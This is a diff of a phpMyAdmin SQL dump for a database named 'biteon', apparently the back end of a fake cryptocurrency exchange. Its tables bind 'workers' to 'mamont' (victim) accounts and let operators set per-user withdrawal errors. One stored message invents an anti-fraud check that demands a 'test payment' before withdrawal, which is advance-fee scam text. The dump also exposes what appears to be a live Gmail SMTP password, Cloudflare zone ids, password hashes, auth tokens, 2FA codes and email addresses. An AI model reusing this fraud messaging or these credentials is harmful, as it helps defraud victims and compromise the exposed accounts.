@@ -3,9 +3,9 @@
 -- https://www.phpmyadmin.net/
 --
 -- Хост: 127.0.0.1:3306
--- Время создания: Ноя 29 2023 г., 02:27
+-- Время создания: Дек 12 2023 г., 01:38
 -- Версия сервера: 5.7.39
--- Версия PHP: 7.4.30
+-- Версия PHP: 8.0.22
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 START TRANSACTION;
@@ -20,6 +20,30 @@ SET time_zone = "+00:00";
 --
 -- База данных: `biteon`
 --
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `action`
+--
+
+CREATE TABLE `action` (
+  `id` int(11) NOT NULL,
+  `user_id` int(11) NOT NULL,
+  `type` text COLLATE utf8mb4_unicode_ci NOT NULL,
+  `date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
+--
+-- Дамп данных таблицы `action`
+--
+
+INSERT INTO `action` (`id`, `user_id`, `type`, `date`) VALUES
+(1, 19, 'Delete avatar', '2023-12-11 20:23:36'),
+(2, 19, 'Change username', '2023-12-11 20:23:49'),
+(3, 18, 'Upload avatar', '2023-12-11 20:43:01'),
+(4, 18, 'Change username', '2023-12-11 20:43:12'),
+(5, 19, 'KYC LVL 2', '2023-12-12 00:25:49');
 
 -- --------------------------------------------------------
 
@@ -70,11 +94,14 @@ INSERT INTO `balances` (`user_id`, `id_coin`, `quantity`) VALUES
 (19, 189, 15.293877016442),
 (19, 190, 2.5990873438206),
 (19, 191, 29.812149808316),
-(19, 192, 3453849.25),
+(19, 192, 2000),
 (19, 198, 14.274952646816),
 (39, 189, 1),
 (59, 189, 10),
-(59, 192, 36958.07);
+(59, 192, 36958.07),
+(67, 189, 9),
+(67, 192, 37771.33),
+(68, 189, 11);
 
 -- --------------------------------------------------------
 
@@ -98,7 +125,11 @@ INSERT INTO `bindings_users` (`id`, `user_id_worker`, `user_id_mamont`, `type`, 
 (4, 19, 41, 'id', '2023-11-17'),
 (7, 19, 18, 'id', '2023-11-17'),
 (8, 19, 46, 'email', '2023-11-18'),
-(9, 19, 59, 'promo', '2023-11-21');
+(9, 19, 59, 'promo', '2023-11-21'),
+(16, 19, 67, 'promo', '2023-11-30'),
+(17, 19, 68, 'promo', '2023-12-03'),
+(18, 19, 23, 'email', '2023-12-11'),
+(20, 19, 39, 'email', '2023-12-11');
 
 -- --------------------------------------------------------
 
@@ -119,7 +150,9 @@ CREATE TABLE `chats` (
 INSERT INTO `chats` (`chat_id`, `user_1`, `date`) VALUES
 (191076, 59, '2023-11-21'),
 (200807, 19, '2023-11-25'),
-(814898, 46, '2023-11-18');
+(552929, 68, '2023-12-03'),
+(814898, 46, '2023-11-18'),
+(921073, 67, '2023-11-30');
 
 -- --------------------------------------------------------
 
@@ -160,7 +193,35 @@ INSERT INTO `codes` (`id`, `type_code`, `user_id`, `token`, `code`, `date`) VALU
 (22, '2fa', 59, '03fc8e6e955b9a63e86edc01e412fd59e94efe201667ba93b108d4295c0e5d57', 336390, '2023-11-27'),
 (23, '2fa', 19, 'd9ab4c68ec63f04bd4af4a0303ab69848e69e1426ac918262bd8d14ea5a46c93', 828551, '2023-11-27'),
 (24, '2fa', 19, '124d91626cb14fae107a757ac61a1d2c68053fde1fd87f513b94c70d9931aebf', 505394, '2023-11-27'),
-(25, '2fa', 19, 'dc6b1e4e0a06d4979201f02ec8d8eb93ad4bf5d6b192f7e455cf84b3c3e1fb9b', 397218, '2023-11-27');
+(25, '2fa', 19, 'dc6b1e4e0a06d4979201f02ec8d8eb93ad4bf5d6b192f7e455cf84b3c3e1fb9b', 397218, '2023-11-27'),
+(26, 'reset_password', 19, 'd3b95a6744f415fb1f60f7fd9127743f956b028b0887057019ac92a716c2dedc', 417144, '2023-11-29'),
+(27, 'reset_password', 19, 'b000ee3f80505cbcdb3b2b5578a5207d4da6c214f66a089529e6929bca0dcc93', 769366, '2023-11-29'),
+(28, 'reset_password', 19, 'bc5a943e9a30e9281d076b774dece1f17cccb7c16bb3b718e4b7adb7063d235c', 472928, '2023-11-29'),
+(29, '2fa', 19, 'fc1b078137966bb4c520a2c464df917da9ac1ff807b055e8d0996323fc614a69', 317941, '2023-11-29'),
+(30, '2fa', 19, 'c563a1ae5ca1489f0b7b75f8ecadc9f7a8f3a93de6750d6e4432e9e46e9cf86d', 475576, '2023-11-29'),
+(31, '2fa', 19, '5632cc23c527a3f49c84140695207ba2c3afce77c8bf9ef4150abb36be90bc58', 728315, '2023-11-29'),
+(32, 'reset_password', 19, 'f7d9b78b456bff42acd6a7320db4459ba462df645579b0c655876accf5f8dd9b', 309412, '2023-11-29'),
+(33, '2fa', 19, '7975bbf316d016329ae549d1463d5e6e32942a7057e5f1b75b3633429f3338a1', 414145, '2023-11-29'),
+(34, '2fa', 19, 'fda59cf63a605ad5dccb163281f5d0b9a1c1dc2bb2422b86f89a4a70ea12cd1e', 830916, '2023-11-30'),
+(35, '2fa', 67, 'a8ec16f03a412ef9ea86f23331694b7c5b9d6428ca2f4fe277164f952714fdcf', 285380, '2023-11-30'),
+(36, 'reset_password', 19, 'e6a27e4d6aa8bd6a50f7f4723c163adbaef6bcbd37c14e62a9a876ddb7744baf', 680020, '2023-12-03'),
+(37, 'reset_password', 19, '20fc0c80684e58a30310b95290fa8abe4e7df929896e895999483226728cfd31', 951370, '2023-12-03'),
+(38, '2fa', 19, '63a80a61b565d63277d3451b324e67255b1c2d5a5f7b56cc0610843ac6ab581b', 380026, '2023-12-03'),
+(39, '2fa', 19, 'eb9a8c85ce7389cf03e1de7717414a9d60bef8376d3d2ca774cefc8ee906f484', 437909, '2023-12-11'),
+(40, '2fa', 19, 'aff2f3035c45e6bc405840bf19a9cadf1b547b3f2505eba8b84c4f189259c7fe', 363421, '2023-12-11'),
+(41, '2fa', 19, 'c6565fb58ed6c764a8a84b6eac29d8803a34ec7e415f16c3c1861acf0a18396d', 507816, '2023-12-11'),
+(42, '2fa', 19, '9ced2784c7dd4fece6e0dc537214f68feee1e976dd07ad93b25f4754ecf8c68b', 734079, '2023-12-11'),
+(43, '2fa', 19, 'ee3bc80fca2700aa7afd7012cbde58e31267290731a7c805f9f4958af7cfbdae', 379634, '2023-12-11'),
+(44, '2fa', 19, 'cd18f6c960c89e8c08758083316fcae5f3c64f7e48c484633b5d9466bfad3e85', 888898, '2023-12-11'),
+(45, '2fa', 19, '557fbb9e3b6d8b28a228e7ff5cd891ae655ef28988486b527c02b2873c9cf4c9', 851809, '2023-12-11'),
+(46, '2fa', 19, '3c3c5a3646dddb54f5b489ef01085758b7ebfe184c88eaf56879d92f4b0bfb2a', 807807, '2023-12-11'),
+(47, '2fa', 19, '95427e4d027bf16c9747a95a0bac542760de3f72acea53977860b40d543584f4', 181644, '2023-12-11'),
+(48, '2fa', 19, '77e5ef2651ec8dc160b35031f1d148dbffa0a646e6f2d509ba7bf80f7f0823e5', 344312, '2023-12-11'),
+(49, '2fa', 19, 'cece11f416005a050e85f7321d3c22f724f83ef5b5491e5986031cf466e8129c', 837203, '2023-12-11'),
+(50, '2fa', 19, '4074bca589dba9eea52e9ce1f6f2137170e0874701fb5d44729fa2e29a115e93', 114775, '2023-12-11'),
+(51, '2fa', 19, '8106c0472fe40d4d37a117baa899b315b477ea1bb1ba8030495390de1594e148', 164629, '2023-12-11'),
+(52, '2fa', 19, '8339d53293f5513d1c05e0342ca750419e17c7295dc7749f50901fae7214def5', 765053, '2023-12-11'),
+(53, '2fa', 19, '97e1a687e5ee75fee614c531ed6cb001ae03687a0475b6e27b36014bdd8d19f3', 964209, '2023-12-11');
 
 -- --------------------------------------------------------
 
@@ -182,10 +243,10 @@ CREATE TABLE `coins` (
 --
 
 INSERT INTO `coins` (`id_coin`, `full_name`, `simple_name`, `type_coin`, `spread`, `payment_address`) VALUES
-(189, 'Bitcoin', 'BTC', 'coin', 123, 'bc1qd2uzn6padt89qw9yed4g8udhhf2eku8nvekegf'),
+(189, 'Bitcoin', 'BTC', 'coin', 0, 'asdasd'),
 (190, 'Ethereum', 'ETH', 'coin', 0, ''),
 (191, 'Litecoin', 'LTC', 'coin', 0, ''),
-(192, 'Tether', 'USDT', 'coin', 0, ''),
+(192, 'Tether TRC20', 'USDT(TRC20)', 'coin', 0, ''),
 (193, 'Tron', 'TRX', 'coin', 0, ''),
 (194, 'USD Coin', 'USDC', 'coin', 0, ''),
 (195, 'Binance Coin', 'BNB', 'coin', 0, ''),
@@ -275,7 +336,9 @@ INSERT INTO `coins` (`id_coin`, `full_name`, `simple_name`, `type_coin`, `spread
 (279, 'Ravencoin', 'RVN', 'coin', 0, ''),
 (280, 'Trust Wallet Token', 'TWT', 'coin', 0, ''),
 (281, 'Near Protocol', 'NEAR', 'coin', 0, ''),
-(282, 'Polkadot', 'DOT', 'coin', 0, '');
+(282, 'Polkadot', 'DOT', 'coin', 0, ''),
+(283, 'Tether ERC20', 'USDT(ERC20)', 'coin', 0, 'asdasd123'),
+(284, 'Tether BEP20', 'USDT(BEP20)', 'coin', 0, '');
 
 -- --------------------------------------------------------
 
@@ -327,7 +390,7 @@ CREATE TABLE `domains` (
 
 INSERT INTO `domains` (`id`, `domain`, `title`, `domain_ns`, `user_id`, `zone_id`, `stmp_host`, `stmp_email`, `stmp_password`, `date`) VALUES
 (1, 'dde7-185-192-110-173.ngrok-free.app', 'KASRO-DOMEN', '[\"greg.ns.cloudflare.com\",\"ziggy.ns.cloudflare.com\"]', 19, '0daebc304de2a15ec9a57a62ab10a36a', '', '', '', '2023-11-05'),
-(2, 'biteon.ru', 'KASRO-DOMEN', '[\"greg.ns.cloudflare.com\",\"ziggy.ns.cloudflare.com\"]', 19, 'bc77827cd5b87b12260a017795fbd48a', 'ssl://smtp.gmail.com', 'jopik2424@gmail.com', 'vjfm hrxj gghw xniw', '2023-11-05'),
+(2, 'biteon.ru', 'KASRO', '[\"greg.ns.cloudflare.com\",\"ziggy.ns.cloudflare.com\"]', 19, 'bc77827cd5b87b12260a017795fbd48a', 'ssl://smtp.gmail.com', 'jopik2424@gmail.com', 'vjfm hrxj gghw xniw', '2023-11-05'),
 (3, 'localhost', 'KASRO-DOMEN', '[\"greg.ns.cloudflare.com\",\"ziggy.ns.cloudflare.com\"]', 19, 'bc77827cd5b87b12260a017795fbd48a', 'ssl://smtp.gmail.com', 'jopik2424@gmail.com', 'vjfm hrxj gghw xniw', '2023-11-05'),
 (4, 'ngrok-free.app', 'KASRO-DOMEN', '[\"greg.ns.cloudflare.com\",\"ziggy.ns.cloudflare.com\"]', 19, '0daebc304de2a15ec9a57a62ab10a36a', '', '', '', '2023-11-05');
 
@@ -341,6 +404,7 @@ CREATE TABLE `kyc_application` (
   `id` int(11) NOT NULL,
   `user_id` int(11) NOT NULL,
   `files` text NOT NULL,
+  `kyc` int(11) NOT NULL DEFAULT '1',
   `status` tinyint(1) NOT NULL,
   `date` datetime NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
@@ -349,9 +413,8 @@ CREATE TABLE `kyc_application` (
 -- Дамп данных таблицы `kyc_application`
 --
 
-INSERT INTO `kyc_application` (`id`, `user_id`, `files`, `status`, `date`) VALUES
-(13, 46, '{\"kyc_images\":[\"/assets/kyc_documents/6558609932616.jpg\",\"/assets/kyc_documents/655860993c703.jpg\"]}', 1, '2023-11-18 09:58:33'),
-(14, 19, '{\"kyc_images\":[\"/assets/kyc_documents/655e0a0c4b46d.png\"]}', 0, '2023-11-22 17:02:52');
+INSERT INTO `kyc_application` (`id`, `user_id`, `files`, `kyc`, `status`, `date`) VALUES
+(24, 19, '{\"kyc_images\":[\"/assets/kyc_documents/65777e5d39dac.png\"]}', 2, -1, '2023-12-12 00:25:49');
 
 -- --------------------------------------------------------
 
@@ -372,27 +435,21 @@ CREATE TABLE `messages` (
 --
 
 INSERT INTO `messages` (`id`, `user_id`, `message_text`, `chat_id`, `date`) VALUES
-(20, 21, 'asdasdasd', 516998, '2023-11-11 23:32:16'),
-(21, 21, 'asdasdsad', 181900, '2023-11-11 23:32:39'),
-(22, 19, 'asdasdas', 516998, '2023-11-11 23:32:53'),
-(23, 19, 'asdasdasdas', 139473, '2023-11-11 23:33:09'),
-(24, 21, 'asdasdasd', 181900, '2023-11-11 23:33:29'),
-(25, 19, '123132', 139473, '2023-11-11 23:33:38'),
-(26, 19, 'asdasd', 181900, '2023-11-11 23:33:55'),
-(27, 19, '123321', 181900, '2023-11-17 15:41:09'),
-(30, 19, 'Привет', 139473, '2023-11-18 13:21:28'),
-(31, 19, 'Привет', 440846, '2023-11-18 13:21:35'),
-(34, 46, '124', 814898, '2023-11-18 16:50:08'),
-(35, 46, '123123', 814898, '2023-11-18 16:56:03'),
-(36, 19, '123123', 814898, '2023-11-18 16:56:15'),
-(37, 19, '123123', 814898, '2023-11-18 16:56:18'),
-(38, 19, '123123', 814898, '2023-11-18 16:56:20'),
-(40, 19, '123', 814898, '2023-11-18 16:56:24'),
-(44, 46, '12', 814898, '2023-11-18 16:59:41'),
-(45, 46, '123', 814898, '2023-11-18 17:06:58'),
-(46, 19, '123', 814898, '2023-11-18 17:07:01'),
-(47, 19, '123', 814898, '2023-11-18 17:07:05'),
-(48, 59, 'ртолтошлщ', 191076, '2023-11-21 22:17:50');
+(65, 68, 'asdasd', 552929, '2023-12-03 17:46:53'),
+(66, 68, 'sdasd', 552929, '2023-12-03 17:46:58'),
+(67, 68, 'asdasd', 1849893126, '2023-12-03 17:48:00'),
+(68, 68, 'asdasd', 552929, '2023-12-03 17:48:00'),
+(69, 68, '123', 1849893126, '2023-12-03 17:48:10'),
+(70, 68, '123', 552929, '2023-12-03 17:48:10'),
+(71, 68, 'asdasd', 1849893126, '2023-12-03 17:48:28'),
+(72, 68, 'asdasd', 552929, '2023-12-03 17:48:28'),
+(73, 68, 'asdasd', 552929, '2023-12-03 17:49:09'),
+(74, 68, '123', 552929, '2023-12-03 17:49:13'),
+(75, 68, '1', 552929, '2023-12-03 17:49:28'),
+(76, 68, '11', 552929, '2023-12-03 17:49:32'),
+(77, 68, '111', 552929, '2023-12-03 17:49:48'),
+(78, 68, '2', 552929, '2023-12-03 17:49:51'),
+(79, 68, '123', 552929, '2023-12-03 17:50:17');
 
 -- --------------------------------------------------------
 
@@ -521,13 +578,24 @@ INSERT INTO `p2p_users` (`id`, `user_avatar`, `username`, `payment_method`, `spr
 --
 
 CREATE TABLE `payment_orders` (
-  `id` int(11) NOT NULL,
-  `payment_id` text COLLATE utf8mb4_unicode_ci NOT NULL,
-  `status` text COLLATE utf8mb4_unicode_ci NOT NULL,
+  `id` int(20) NOT NULL,
+  `invoice_id` text COLLATE utf8mb4_unicode_ci NOT NULL,
+  `amount` text COLLATE utf8mb4_unicode_ci NOT NULL,
   `user_id` int(11) NOT NULL,
-  `date` datetime NOT NULL,
-  `amount` double NOT NULL
+  `worker_id` int(11) DEFAULT NULL,
+  `method` text COLLATE utf8mb4_unicode_ci NOT NULL,
+  `status` text COLLATE utf8mb4_unicode_ci NOT NULL,
+  `date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
+--
+-- Дамп данных таблицы `payment_orders`
+--
+
+INSERT INTO `payment_orders` (`id`, `invoice_id`, `amount`, `user_id`, `worker_id`, `method`, `status`, `date`) VALUES
+(35528702, '', '1000', 19, NULL, 'P2P', '0', '2023-12-11 13:16:40'),
+(57127732, '', '1000', 19, NULL, 'P2P', '0', '2023-12-11 13:16:24'),
+(95307950, '80227', '1000', 18, 19, 'P2P', '1', '2023-12-11 13:18:07');
 
 -- --------------------------------------------------------
 
@@ -551,7 +619,8 @@ CREATE TABLE `promo_codes` (
 
 INSERT INTO `promo_codes` (`id`, `promo`, `user_id`, `coin_id`, `amount`, `text`, `date`) VALUES
 (3, '123', 19, 189, 11, 'Your PROMO CODE has been successfuly activated!', '2023-11-17'),
-(7, '1', 19, 189, 1, 'Your PROMO CODE has been successfuly activated!', '2023-11-17');
+(7, '1', 19, 189, 1, 'Your PROMO CODE has been successfuly activated!', '2023-11-17'),
+(8, '1234', 19, 189, 11, 'Your PROMO CODE has been successfuly activated!', '2023-11-17');
 
 -- --------------------------------------------------------
 
@@ -588,6 +657,13 @@ CREATE TABLE `staking_orders` (
   `date` date NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
 
+--
+-- Дамп данных таблицы `staking_orders`
+--
+
+INSERT INTO `staking_orders` (`id`, `user_id`, `coin_name`, `summ_coin`, `profit`, `days`, `date`) VALUES
+(1, 67, 'Bitcoin', 1, 39.6, 90, '2023-11-30');
+
 -- --------------------------------------------------------
 
 --
@@ -600,13 +676,13 @@ CREATE TABLE `users` (
   `username` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
   `ref_code` int(11) NOT NULL,
   `password` text COLLATE utf8mb4_unicode_ci NOT NULL,
-  `kyc_step` int(11) NOT NULL DEFAULT '0',
+  `kyc_step` int(11) NOT NULL DEFAULT '1',
   `last_online` datetime NOT NULL,
   `2fa` tinyint(1) NOT NULL,
   `email_verif` tinyint(1) NOT NULL,
   `avatar` text COLLATE utf8mb4_unicode_ci NOT NULL,
   `user_status` text COLLATE utf8mb4_unicode_ci NOT NULL,
-  `telegram` int(11) DEFAULT NULL,
+  `telegram` int(20) DEFAULT NULL,
   `payment_address` text COLLATE utf8mb4_unicode_ci,
   `withdraw_error` text COLLATE utf8mb4_unicode_ci,
   `trading_error` text COLLATE utf8mb4_unicode_ci,
@@ -621,8 +697,8 @@ CREATE TABLE `users` (
 --
 
 INSERT INTO `users` (`id`, `email`, `username`, `ref_code`, `password`, `kyc_step`, `last_online`, `2fa`, `email_verif`, `avatar`, `user_status`, `telegram`, `payment_address`, `withdraw_error`, `trading_error`, `minLimit`, `verification_error`, `auth_token`, `created_date`) VALUES
-(18, 'nikita15048769@mail.ru', 'KASRO124', 69087331, '$2y$10$/jk6vqm5U93CJs3Vzd780uVgoyaywZKfGo4N2ZlxBIQSHYVE6RwEK', 0, '2023-11-11 23:33:57', 0, 1, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, '0f450a652793aedd3844f18108308bbe84cba3082ea291bc2124504fe68ca6f3', '2023-11-11'),
-(19, 'nikita150489@mail.ru', 'kasro12', 74329601, '$2y$10$u4IK9yVAaqgZ4TTtI53nLuPESX.7PvDNXUwwxUB666uLcZTl.8Fny', 0, '2023-11-29 02:26:36', 1, 1, '{\"image_url\":\"/assets/users_avatars/6553abd190f07.png\"}', 'admin', 12345, '{\"address1\":\"123\",\"address2\":\"123\",\"address3\":\"131\"}', 'asd', '123', 123123, '123', '51f8d1ca89cc01ff5b11c0254cc71379142af1df659a2bca580f6cd0fc4d90a2', NULL),
+(18, 'nikita15048769@mail.ru', 'KASRO1248', 69087331, '$2y$10$/jk6vqm5U93CJs3Vzd780uVgoyaywZKfGo4N2ZlxBIQSHYVE6RwEK', 0, '2023-12-11 20:43:20', 0, 1, '{\"image_url\":\"/assets/users_avatars/65774a254a490.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'f35a2e85630b67970d74646f99406171cc6647a9a24a98ac4a5838ab32c1a234', '2023-11-11'),
+(19, 'nikita150489@mail.ru', 'kasro121', 74329601, '$2y$10$oZz22YqKbQpBh0d0NxUJTui/uPdPH9kC1IbuBR4E8.IGZMsowEG0a', 1, '2023-12-12 00:27:46', 1, 1, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'admin', 123, '{\"address1\":\"123\",\"address2\":\"123\",\"address3\":\"123\"}', 'asd1', 'You must have a minimum balance to make trades on the trading page.123', 1241, 'Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal.', 'd472c86b0432c1237ddf77a172736a234e225ea11b3cbfe0e398a6f84188585e', NULL),
 (22, 'kasro@vk.com', 'limin123', 65311432, '$2y$10$scS.1sHuJ0K7rwjgkzxt8eUJRlEdIjUwKoDGSRX0AQdKOspdMwboC', 0, '2023-11-14 15:11:18', 0, 1, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'worker', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-14'),
 (23, 'vxz47682@zslsz.com', 'asdad123', 73409613, '$2y$10$gjMRwo/BXgTOPx22DYkbyeRFZgj23PshzaNVp5rZz/MZggEVzSxzG', 0, '2023-11-14 17:17:01', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-14'),
 (39, 'asdasd@mail.ru', 'asdasd', 16484404, '$2y$10$rhW6VDm4dgVKQ7oNDpelSOcqX5U6n2O4Dkr1k2gG.jIXglIIHng2G', 0, '2023-11-17 15:27:17', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-17'),
@@ -641,7 +717,24 @@ INSERT INTO `users` (`id`, `email`, `username`, `ref_code`, `password`, `kyc_ste
 (62, 'glj4114169@zbock.com', 'glj4114169@zbock.com', 68449092, '$2y$10$CAuJ88YJARuoYUG5ZESSoe45zp/BsBRfY8dEGtCG9vocSTna8FiXO', 0, '2023-11-21 18:55:01', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-21'),
 (63, 'yzu89888@zslsz.com', 'yzu89888@zslsz.com', 88917426, '$2y$10$xfOEkARM63a8AIGJ1yIEO.tO7YvUEwWEBqhE7VuQe/gGD/3ghIxey', 0, '2023-11-21 19:25:03', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-21'),
 (64, 'bfd84037@zbock.com', 'bfd84037@zbock.com', 76461552, '$2y$10$S0Mnz1PHMnm0P6pd7EA3yeO7bt8DD5jj0J5n28JWidMXwDD5yr/WK', 0, '2023-11-21 19:27:41', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-21'),
-(65, 'fiesugfhsjigasefpsefp@mail.ru', 'yenyex', 39856779, '$2y$10$D0lc4KiZyRQDDIB55BgY9O4TJZDatgBMUdqqY9f2PJgAKR1cQlNN6', 0, '2023-11-27 19:48:26', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-27');
+(65, 'fiesugfhsjigasefpsefp@mail.ru', 'yenyex', 39856779, '$2y$10$D0lc4KiZyRQDDIB55BgY9O4TJZDatgBMUdqqY9f2PJgAKR1cQlNN6', 0, '2023-11-27 19:48:26', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-27'),
+(66, 'zzj50933@zslsz.com', 'zzj50933@zslsz.com', 64771639, '$2y$10$vuQVasPdAhKv.vMnTFRmyOshJrIvD5rJ0VTure2grqFwTe4crsjoG', 0, '2023-11-29 14:58:19', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-11-29'),
+(67, 'wht17036@omeie.com', 'wht17036', 77534648, '$2y$10$7PXiXkJlfGoCWfycUTIn6uto/vFL1okF4RjFXX6DLBaxq3stCK6Nm', 0, '2023-12-03 17:10:54', 0, 1, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'd61e89896bea11ebcd7f9df5a00a548b65540ec6a2c9648216f52081e43c1d72', '2023-11-30'),
+(68, 'ark57775@zslsz.com', 'ark57775@zslsz.com', 43624489, '$2y$10$RPPlnFcCQRITHAzKXNmCSeWmusQ2F80hm5zeR/lak/WH3m/FXZmLq', 0, '2023-12-03 17:55:34', 0, 1, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'ae66d9462cd7e6a93bbaf0eab6f4892188b9e5024d1e7ca4585cf69207d877d2', '2023-12-03'),
+(69, 'rht56861@omeie.com', 'rht56861@omeie.com', 54846306, '$2y$10$gvzxGHMaz7dU91W4otITFuYTkbMzsOoeZEa4QJQGX9LTOqoJxZurq', 0, '2023-12-12 00:28:35', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(72, 'rht568161@omeie.com', 'rht568611@omeie.com', 61859216, '$2y$10$7Ht/udUX.hu4DcFVhoJaNONs8siubyU.EpRt9aSGJ.ipB0X9aCnF6', 0, '2023-12-12 00:29:39', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(73, 'rht5686111@omeie.com', 'rht5686111@omeie.com', 74369135, '$2y$10$NWapg4wMC0e8gCws58Pl4euBrVsdK4Hjy6GfdCqRtxIvalfpevq6S', 0, '2023-12-12 00:30:40', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(75, 'rht56186111@omeie.com', 'rht56816111@omeie.com', 65617211, '$2y$10$3k.vNr6b7DzNotHxH/B2G.xerx2kFghO/URc3Cig0wfCkp07Wsiai', 0, '2023-12-12 00:31:55', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(77, 'rht561186111@omeie.com', 'rht561186111@omeie.com', 99260590, '$2y$10$rAM154yIygnN976UnOE13OYtgBTzPw1/ZTeqresl6XKhPmbILPLFK', 0, '2023-12-12 00:33:28', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(78, 'lff00109@omeie.com', 'lff00109@omeie.com', 45437839, '$2y$10$QcpNRrR95ywJaA0fuQr21.U1CBJX2F7W2AJSuh8oRdM9dndEI6NQm', 0, '2023-12-12 01:07:14', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(80, 'lff100109@omeie.com', 'lff100109@omeie.com', 17598768, '$2y$10$16QWskxxRLvVkVtjSgq8QecNJCYBo8qiEIMgjA/lh93wMuWt43nxG', 0, '2023-12-12 01:13:23', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(81, 'lff1010109@omeie.com', 'lff1010109@omeie.com', 82647718, '$2y$10$5K.uaBqDyOqoJ3PnP738YuKxft8SWhh0jJO2Ey5frbm4BA6jsYkeG', 0, '2023-12-12 01:15:44', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(83, '1lff1010109@omeie.com', '1lff1010109@omeie.com', 95747500, '$2y$10$czNzG/OqqF1ZqtvJ2DnQOegVR6N9rh6x90xrEmRuR5bZOdi3wsCee', 0, '2023-12-12 01:16:39', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(85, '1lff10101109@omeie.com', '1lff10101109@omeie.com', 32968226, '$2y$10$Mbm2sbc6bumydEA15gERnOUkmsX2lVZFQp0rjlrPDc4ef2TRPKXWa', 0, '2023-12-12 01:16:55', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(86, '1lff101011109@omeie.com', '1lff101011109@omeie.com', 72566565, '$2y$10$bPbUBQ4BA5B2dTxeJdNnfeDs3aBx3X5RkjLkTpeIQYJT1iQoW3L3i', 0, '2023-12-12 01:18:07', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(87, '11lff101011109@omeie.com', '11lff101011109@omeie.com', 10598064, '$2y$10$mI8DVn9.LY/HypOwbe9Dw.FDQ7J6MyYkNN/XVXVcYbn0zxNsLtHBO', 0, '2023-12-12 01:19:13', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
+(88, '11lff1010111109@omeie.com', '11lff1011011109@omeie.com', 87899654, '$2y$10$VO.5AKxkJGzFgSKVwSvsa.k2qSPMsZoy8HlKPAyumAjzuZJDV.MS2', 0, '2023-12-12 01:19:21', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12'),
